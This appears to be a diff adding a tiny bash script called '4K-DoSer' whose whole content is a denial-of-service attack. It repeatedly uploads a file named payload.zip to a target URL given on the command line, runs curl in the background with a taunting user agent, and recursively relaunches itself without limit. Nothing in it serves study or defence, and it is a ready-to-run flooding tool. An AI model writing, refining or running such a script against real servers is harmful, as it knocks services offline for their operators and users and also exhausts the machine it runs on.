@@ -1,0 +1,9 @@
+#!/bin/bash
+clear
+echo '4K-DoSer'
+echo 'Attacking' $1
+
+#Loop Doesn't work on Mobile
+
+curl  -s --form "fileupload=@payload.zip" $1 -A '4K-DoSer/0.1-M (DoSed by a Skid #TANGODOWN)' -o null > /dev/null 2>&1 &
+sh 4K-DoSer.sh $1
